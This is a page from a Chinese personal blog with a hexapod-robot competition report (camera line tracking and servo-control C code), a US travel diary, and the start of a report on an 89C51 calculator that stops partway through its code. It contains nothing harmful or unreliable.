<!doctype html>



  


<html class="theme-next pisces use-motion">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.2" />






<meta name="description" content="乱七八糟的个人学习生活记录">
<meta property="og:type" content="website">
<meta property="og:title" content="梦的小窝">
<meta property="og:url" content="http://hsmouc.com/index.html">
<meta property="og:site_name" content="梦的小窝">
<meta property="og:description" content="乱七八糟的个人学习生活记录">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="梦的小窝">
<meta name="twitter:description" content="乱七八糟的个人学习生活记录">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    }
  };
</script>




  <link rel="canonical" href="http://hsmouc.com/"/>


  <title> 梦的小窝 </title>
</head>

<body itemscope itemtype="//schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">梦的小窝</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle"></p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/10/22/2016-10-22-robot/" itemprop="url">
                  六足机器人技术报告
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-10-22T20:15:23+08:00" content="2016-10-22">
              2016-10-22
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/嵌入式开发/" itemprop="url" rel="index">
                    <span itemprop="name">嵌入式开发</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li>这是我们参加山东省高校第五届机器人大赛六足机器人比赛的技术报告，使用的是青岛德林科姆公司开发的商业机器人。这里不得不吐槽一下这玩意的问题真的好多，具体来说就是六足机器人的概念，从各种地方拼凑了一份代码。代码的每一部分看起来都有点道理，但是拼在一起就完全不对了(._.)在这里整理一下我们修改过的代码和比赛项目的实现思路。</li>
</ul>
<h3 id="机器人的总体设计"><a href="#机器人的总体设计" class="headerlink" title="机器人的总体设计"></a>机器人的总体设计</h3><p>这个是班主任公司搞的机器人，具体优点就不多说了。单片机选用了我们比较熟悉的飞思卡尔公司的K60，机器人运动是由18路数字舵机组成的六条腿实现的，正常行走使用的是传统的三足步态，如下图：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f91aunjx6sj30id0fr3zx.jpg" alt="三角步态"><br>考虑到六足机器人的地形适应性比较强，所以我们还使用了一种多边形步态，如下图：<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f91axvle0lj30q20hh765.jpg" alt="多边形步态"><br>机器人配备了MPU6050(姿态传感器)，红外传感器(用于避障),数字摄像头，超声波传感器(可以测距)，机器人的大概样子如下：<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f91b1p0d2fj31kw16oqao.jpg" alt="机器人外观"><br>上面那个盖子正前方的中间放有摄像头，红外，超声波传感器(在图片没拍到的那一端)，这个摄像头的位置安排很不科学，等下在介绍比赛规则的时候再详细说。</p>
<h3 id="比赛内容和实现思路"><a href="#比赛内容和实现思路" class="headerlink" title="比赛内容和实现思路"></a>比赛内容和实现思路</h3><ul>
<li>这个比赛分为两项内容：自主循迹和创意表演.  </li>
</ul>
<p>自主循迹要求机器人按规定的路径自主循迹到达终点，轨迹如下图：<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f91bh0aau9j30k60eoq3p.jpg" alt="比赛场地"><br>另一项是创意表演，表演内容自定，我们设计的是自主爬楼梯和悬崖预警两个项目。</p>
<h3 id="自主循迹的工作流程"><a href="#自主循迹的工作流程" class="headerlink" title="自主循迹的工作流程"></a>自主循迹的工作流程</h3><p>该部分包含摄像头图像处理部分和舵机控制部分，下面分别介绍：  </p>
<h4 id="摄像头的图像处理"><a href="#摄像头的图像处理" class="headerlink" title="摄像头的图像处理"></a>摄像头的图像处理</h4><p>先说原来不合理的摄像头位置，原先的摄像头视角是水平的，和机器人运动的方向相同，这样子的话看到的赛道面积就非常小。我们按飞思卡尔比赛摄像头车的方案设计了一个摄像头支架，重新安装了摄像头。如图：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f91cvf94naj30qo0f00tk.jpg" alt="摄像头支架"><br>这个系统使用了OmniVision公司生产的OV7725摄像头，该摄像头具有硬件二值化的功能，即图像采集完只有0xFF(白色)和0x00(黑色)两种情况。这种方式大大节省了单片机的资源，使其不需要分奇偶场来采集图像，同时二值化的图像简化了处理的算法，不需要计算灰度阈值来寻找边界。下面介绍该摄像头的配置：<br>    该摄像头的配置接口为标准的SCCB(Serial Camera Control Bus)，这种串行相机控制总线的实质和我们使用的IIC总线类似，有一根时钟线和一根数据线。OV7725寄存器的配置见附件代码。配置好摄像头后还需要对SCCB传回的数据进行转换，这里详细介绍：<br>SCCB总线输出的数据为8bits，即八个像素点为一个数据。由于我们需要得知图像中每一个像素点的情况，需要将其解压，在这里提供一个解压图像的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">void img_extract(u8 *data1,u8 *data2,u16 lenth)</div><div class="line">&#123;</div><div class="line">    u8  color[2] = &#123;0,255&#125;;</div><div class="line">    u8  temp;</div><div class="line">    while(lenth--)</div><div class="line">    &#123;</div><div class="line">        temp = *data1++;</div><div class="line">		 *data2++ = color[(temp &gt;&gt; 7) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 6) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 5) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 4) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 3) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 2) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 1) &amp; 0x01];</div><div class="line">        *data2++ = color[(temp &gt;&gt; 0) &amp; 0x01];</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数的传入data1数组，并将其解压赋值给data2数组，lenth由摄像头的分辨率决定。<br>得到摄像头采回的图像后即可对其进行处理。机器人的六足运动特性决定了它的运动速度，所以不需要对图像进行特别精细的分析。我们使用的图像分辨率为320*240，采用中间的一行即第120行进行赛道判断。我们认为第160个像素点为赛道中点，为白色。分别向左右两侧寻找第一个黑点，这两个黑点对应的就是两边的赛道边界。将两个黑色像素点的位置取平均，即可算出机器人所面向的位置和实际赛道方向的偏差Err。因为该机器人的转向角度是离散的，不需要复杂的PID控制。当其方向偏左，调用向右转向的动作组即可，方向偏右时同理。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">int imgProcess(void)&#123;</div><div class="line">  u32 i;</div><div class="line">  int err;</div><div class="line">  LEdge = 10;</div><div class="line">  REdge = 310;</div><div class="line">  for(i = 320*50+mid; i &lt; 320*50+310 ;i++)&#123;</div><div class="line">    if(*(img+i) == 0x00)&#123;</div><div class="line">      REdge = i-320*50;</div><div class="line">      break;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  for(i = 320*50+mid; i &gt; 320*50+10 ;i--)&#123;</div><div class="line">    if(*(img+i) == 0x00)&#123;</div><div class="line">      LEdge = i-320*50;</div><div class="line">      break;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  mid = (LEdge + REdge)/2;</div><div class="line">  err = (LEdge + REdge)/2 - 160;</div><div class="line"></div><div class="line">  return err;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(imgErr &lt; -22)&#123;</div><div class="line"> 	motionCtr(left);</div><div class="line">&#125;</div><div class="line"> if(imgErr &gt; 22) &#123;</div><div class="line">        motionCtr(right);</div><div class="line">&#125;</div><div class="line">if(imgErr &gt;= -22 &amp;&amp; imgErr &lt;= 22)&#123;</div><div class="line">        motionCtr(forward);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="舵机控制方案"><a href="#舵机控制方案" class="headerlink" title="舵机控制方案"></a>舵机控制方案</h4><p>我个人觉得这里是这个商业六足机器人唯一的亮点就是对舵机的系统控制，大大简化了二次开发的流程。据说这套控制方案和上位机是我们专业的一个研究生学姐搞的，先膜一下。<br>这套方案的亮点在于一个AT24C1024芯片，相当于给单片机连上了一块硬盘。在对三足步态或者多边形步态进行调试的时候，需要确定每个舵机的位置，若是将每个舵机动作的位置按顺序写入单片机程序中肯定会写上好几千行，而且进行修改的时候非常麻烦。通过公司提供的可视化上位机我们可以将动作组写好，并以XML文档的形式存入电脑，完成后通过串口和单片机通信，按一定的规则存入EEPROM。这样当需要调用动作组前进，左转或者右转的时候只需要按规则读取EEPROM中的舵机信息并循环调用舵机控制程序即可。<br>我们重写了舵机控制的函数，如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">void motionGet(u8 flag,u8 *servo_dat)&#123;</div><div class="line">  system_run_mark=1;</div><div class="line">  servo_control_mark=1;</div><div class="line">  servo_SQ=flag;</div><div class="line">  servo_group_num[servo_SQ]=ReadAT24C1024_byte(servo_SQ*5000,0x00);</div><div class="line">  if(servo_group_num[servo_SQ]!=0)&#123;      		ReadAT24C1024_flash(servo_dat,servo_SQ*5000+1,0x00,servo_group_num[servo_SQ]*160);</div><div class="line">  &#125;  </div><div class="line">  servo_run_over_mark=1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>motionGet函数传入的是动作组调用标志，0为直走，1为左转，2为右转。servo_dat数组为舵机动作的详细参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">void motionCtr(u8 *servo_dat)&#123;</div><div class="line">  j=0;</div><div class="line">  while(j&lt;servo_group_num[servo_SQ])&#123;</div><div class="line">    if(servo_run_over_mark)</div><div class="line">    &#123;</div><div class="line">      for(i=0;i&lt;32;i++)&#123;</div><div class="line">        servo_run_over[i]=0;</div><div class="line">      &#125;</div><div class="line">      for(i=0;i&lt;32;i++)&#123;</div><div class="line">        if((servo_dat[ 160*j + 5*i ]-1)==i)&#123;</div><div class="line">          servo_num_set[i]=servo_dat[ 160*j + 5*i ];</div><div class="line">          servo_position_set[i]=(servo_dat[ 160*j + 5*i + 1]*256 + servo_dat[ 160*j + 5*i + 2 ])/5;</div><div class="line">          servo_time_set[i]=(servo_dat[ 160*j + 5*i + 3 ]*256 + servo_dat[ 160*j + 5*i + 4])/100;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      SERVO_control(servo_num_set,servo_position_set,servo_time_set);</div><div class="line">      j++;</div><div class="line">     &#125;</div><div class="line">    servo_run_over_mark=1;</div><div class="line">    SERVO_run_all();</div><div class="line">    for(i=0;i&lt;32;i++)&#123;</div><div class="line">      servo_run_over_mark=servo_run_over_mark&amp;&amp;servo_run_over[i];</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这个函数包含了原程序提供的舵机数据转换和舵机控制代码,主要作用是用来控制舵机动作。<br>值得注意的是，如果我们在机器人向前不断走动的时候调用读取EEPROM的程序会导致机器人卡顿。原因是从EEPROM读的数据量较大，且数据传输速率有限。解决方案是在机器人开机后先读取EEPROM中的动作组，并将其存入单片机的数据段，这样就相当于在计算机中将数据从硬盘载入内存，提高了机器人运行的效率。<br>主函数中读取转存的关键代码如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">  u8 left[5000];</div><div class="line">    u8 right[5000];</div><div class="line">    u8 forward[5000];</div><div class="line">    system_init();</div><div class="line">    motionGet(0,forward);</div><div class="line">    motionGet(1,left);</div><div class="line">motionGet(2,right);</div></pre></td></tr></table></figure></p>
<h3 id="创意表演的实现"><a href="#创意表演的实现" class="headerlink" title="创意表演的实现"></a>创意表演的实现</h3><h4 id="机器人爬台阶"><a href="#机器人爬台阶" class="headerlink" title="机器人爬台阶"></a>机器人爬台阶</h4><p>若前方出现障碍，机器人前方安装的水平红外传感器会输出低电平触发外部中断。同时使用机器人上方伸出并与水平面垂直的红外传感器进行障碍高度判定。该传感器的高度已事先根据机器人最大越障高度调整好，若其输出低电平，说明该障碍的高度已超出机器人越障极限，触发中断并放弃翻越。<br>流程如下图所示：<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f91cp7tiknj30d40dsdgg.jpg" alt="流程图"><br>这种逻辑确保了机器人不会撞上目标障碍，同时若是障碍过高无法翻越，机器人不会尝试翻越以避免翻倒。</p>
<h4 id="悬崖预警"><a href="#悬崖预警" class="headerlink" title="悬崖预警"></a>悬崖预警</h4><p>我们基于红外线传感器给出了一套悬崖预警解决方案。在机身下有一个红外线传感器用以实时监测六足机器人机身与前方地面的距离是否安全。若出现前方判断与地面距离突然变大的情况即认为出现悬崖。红外传感器输出低电平触发外部中断，立即停止机器人所有动作以避免出现危险。</p>
<h3 id="小小的总结"><a href="#小小的总结" class="headerlink" title="小小的总结"></a>小小的总结</h3><p>在六足机器人的代码的修改中遇到了各种麻烦的问题。虽说是商业机器人，但是提供的开发程序例程问题相当大，内部有各种冲突的问题。我印象最深的是它配置摄像头的分辨率为320*240，但是寄存器却是按照80*60来配置。我Google了好多资料才找出问题所在。没有给出一份摄像头可用且舵机可操作的代码，我们自己合了一份，也是各种冲突不断，浪费了很多时间。就算是锻炼了改错能力了吧233</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/08/12/2016-08-12-the USA/" itemprop="url">
                  美国游玩小记
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-08-12T21:55:13+08:00" content="2016-08-12">
              2016-08-12
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/杂七杂八/" itemprop="url" rel="index">
                    <span itemprop="name">杂七杂八</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li>今年暑假在美帝呆了二十多天，简单记录一下美帝生活的一些小事。</li>
</ul>
<h3 id="南加州"><a href="#南加州" class="headerlink" title="南加州"></a>南加州</h3><p>南加州给人的最直接的感觉就是无比充足的阳光，天气好到不要钱。我并没有在LA呆很长时间，而是住在一个叫San Bernardino的城市住了好久，那里属于High Desert地区。既然是沙漠，那么干燥和炎热一定是那里的全部了。<br>从飞机上拍摄的旧金山和随手街拍的我住的社区：<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f6reg0s92fj31kw1kwkjl.jpg" alt="洛杉矶"><br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f6rehbnyggj31kw16otys.jpg" alt="我住的地方"><br>虽说我住在沙漠中午正常40度＋，但其实并没有大家想象中的那么难以忍受，相反我觉得还是青岛和南京更热一些。论日晒强度的话青岛真的弱爆惹ˊ_&gt;ˋ<br>在这里我看了Ice Age，貌似国内还没上映，电影票长这样：<img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f6rellgte0j31kw23u7wh.jpg" alt="电影票">。<br>买电影票的时候特别有意思，售票的人问我你是学生不，我说我是，但是我是中国的学生来美国旅游，我可能没有证件证明我是学生。售票员说，没关系，是学生就行。爽快的给我了学生票省了大约$4。<br>我还顺便去了旁边一个小镇叫Bear valley，大概那里的森林就是夏天让人远足，冬天可以滑雪。<br>登山路上遇到的热情的妹子：<img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f6requyns2j31kw16ob29.jpg" alt="妹子和我"><br>貌似山里的树叫pineapple tree，味道出奇的好闻。那个小镇感觉非常欧洲，游人并不多，主要是锻炼身体骑自行车的当地人。顺便说一句，他们骑自行车完全不用担心美国满大街跑的汽车，因为所有的汽车一看到人就会停下来让你先走。在天朝呆习惯了确实很难适应，每次都是我一看到车，我停下来车也停下来，然后看到司机远远的向我挥手示意我先走，摆出一个标准的美式微笑。真的是蜜汁尴尬又蜜汁感动QAQ<br>另外，比较震撼的事情就是美帝一个小村子每个周居然都有草地音乐节，我去的那周是Rock&amp;Roll，80s，表演的乐队水平居然还异乎寻常的高，给一张当时随手拍的照片：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f6rezrarqxj31kw16oh2x.jpg" alt="音乐节"><br>大概就像这样，人人带着自己的小椅子和picnic需要的食物一边吃一边听音乐。傍晚的时候可以欣赏到绝美的晚霞，入夜之后就是满天的繁星。我不得不感叹一下美国的生态保护真的做的非常到位。矿泉水的瓶盖超薄而且他们所有的瓶子都要回收再利用，加州好多人家都用太阳能来提供电力。虽然高速公路满满的全是车，经常堵，但是美国人开车几乎不变道，所以虽然在堵车，车流还是会一直向前移动。<br>另外我比较意外的是美帝的Carpool车道，至少车里坐两个人才能走这条车道。这条车道一般非常顺畅，因为洛杉矶地区大堵车完全是因为车实在太多。他们人手一辆车开车从附近的城市去洛杉矶工作，所以早高峰晚高峰的时候高速公路非常的拥堵，carpool车道应该是鼓励大家几个人乘一辆车提高运力吧。然而在美帝人人都爱开车的国情下好像并没有什么卵用。  </p>
<h3 id="北加州"><a href="#北加州" class="headerlink" title="北加州"></a>北加州</h3><p>加州比较狭长，感觉北加州和南加州已经不是一个世界了，我去了奥克兰和旧金山。旧金山的气温只有十几度，我不能免俗的去了一波硅谷参观了一下斯坦福大学。发现他们的厕所马桶都是xx牌子的，表示我家里都买不起好吗……斯坦福纪念堂我原来以为会是一个博物馆没想到是一个教堂。<br>斯坦福的教堂穹顶和风景：<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f6rtc897bxj31kw1i9b0l.jpg" alt="斯坦福大学"><br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f6rtcu478yj31kw1kwhaj.jpg" alt="还是斯坦福"><br>说到斯坦福就不得不提到传说中的加大伯克利分校了，我要提的就是一个东西：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f6rteq6mppj31kw23uqv6.jpg" alt=""><br>诺贝尔奖得主的保留停车位！！！我当时就震惊了…… 什么都别说了，我想去伯克利搬砖。<br>我还去了一些所谓的地标比如金门大桥什么的感觉一点都不好玩，还是放一张图吧：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f6rtzpz6acj31kw23uqv5.jpg" alt="传说中的金门大桥"> </p>
<h3 id="亚利桑那和内华达"><a href="#亚利桑那和内华达" class="headerlink" title="亚利桑那和内华达"></a>亚利桑那和内华达</h3><p>我去了这两个州完全是因为我对Grand Canyon有一种执念。上学期我的高级英语课选了美国历史文化，外教要求我们选美国的一个州做海报。阴差阳错选了亚利桑那就讲了大峡谷，当时就被震撼了。所以去美国以后就去了亚利桑那州。先放两张大峡谷的图好了。<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f6rtqdy9xkj31kw1kw4qp.jpg" alt="思考人生的我"><br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f6rtrjahf6j31kw1kwe81.jpg" alt="峡谷景观"><br>大峡谷是美帝的国家公园，我原来还想去Yellowstone和Yosemite的，无奈时间不够呀。回加州的路上去了胡佛大坝，比起三峡来其实也不算什么，但是拍起来就是很好看。<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f6ru1i3x6dj31kw1kwe81.jpg" alt="胡佛大坝"><br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f6ru1z91woj31kw1kwdy5.jpg" alt=""></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/05/19/2016-05-19-Calculator/" itemprop="url">
                  基于89C51的计算器设计
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-05-19T21:55:13+08:00" content="2016-05-19">
              2016-05-19
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/嵌入式开发/" itemprop="url" rel="index">
                    <span itemprop="name">嵌入式开发</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="电子系统设计实验课–计算器"><a href="#电子系统设计实验课–计算器" class="headerlink" title="电子系统设计实验课–计算器"></a>电子系统设计实验课–计算器</h2><p>这篇文章是我电子系统设计课的第一次大作业报告。老师要求从六个题目当中选一个做项目，我选择的是看起来最复杂的一个。因为其他的项目貌似只要修改我之前的万能电子钟的代码就好，简易计算器这个项目算是从零开始啦。  </p>
<h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><p>单片机读键值和LCD显示的方法我们再熟悉不过了。这些都有已经构建好的底层文件，直接调用接口函数就好了。读键值的函数作用是有键按下，则返回一个unsigned char型数。所以我们首先需要做一次转换，目的是我定义一个键，按下它就为1或者2或者3等等，便于下一步的计算。第二个问题是，当我们依次按下了键1、键2，单片机会读入的值是1，接着又读入2，我们实际需要计算的值为12。我进行了第二次转换，即将上次读回的值乘10加这次读回的值。我们把完整的一次计算过程大致分为四步：输入第一个数，输入运算符号，输入第二个数，按等于号显示结果。  </p>
<h3 id="目前实现的功能和问题"><a href="#目前实现的功能和问题" class="headerlink" title="目前实现的功能和问题"></a>目前实现的功能和问题</h3><p>功能:    </p>
<ol>
<li>－32767至＋32768之间的加减乘除整数运算。</li>
<li>－32767至＋32768之间的加减小数运算，仅能算一位小数，两位就bug，原因等下说。</li>
<li>可以清屏。</li>
</ol>
<p>这样看起来功能确实挺弱智的，但是基本上满足了这次作业的要求，说实话做的时间不大够最近又很烦，就留了很多的bug没解决。<br>问题：  </p>
<ol>
<li>小数功能不完善是因为小数部分计算的算法不合理。我在这个计算器里开的所有变量几乎都是整型，51的话全用float会造成数据溢出。所以小数的计算其实是当成整数算的，输入等式为12.3+12.3的时候，程序的执行过程是12+12，3+3，得到24，6两个数，中间显示个小数点。这种太脑残的方法不适用于乘除，我又没空给乘除写单独的算法就把这bug暂且扔在那儿了。</li>
<li>小数位数限制还是因为这算法过于简单，12.3＋12.31的算式在单片机中就算成了12+12，3+31，输出的结果就不正确了。</li>
<li>显示有一些问题。那个鬼畜的LCD1602有的时候会自动移位显示，有的时候会把我原来显示的东西覆盖掉，目前来看显示方面的bug基本被我改完了，基本不会出现显示算式不正确的情况。</li>
</ol>
<h3 id="硬件电路和实现效果图"><a href="#硬件电路和实现效果图" class="headerlink" title="硬件电路和实现效果图"></a>硬件电路和实现效果图</h3><p><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f44dc9snl4j31740s4amf.jpg" alt="电路图"><br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f44dd4o5duj31kw16ok9y.jpg" alt="实现效果"></p>
<h3 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h3><h4 id="第一部分：底层-硬件-软件接口"><a href="#第一部分：底层-硬件-软件接口" class="headerlink" title="第一部分：底层/硬件-软件接口"></a>第一部分：底层/硬件-软件接口</h4><p>这里是使用hc165芯片来读键值程序，使用hc_165()返回的就是键值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">sbit hc165_sdo=P2^5;</div><div class="line">sbit hc165_sclk=P2^6;</div><div class="line">sbit hc165_pl=P2^7;</div><div 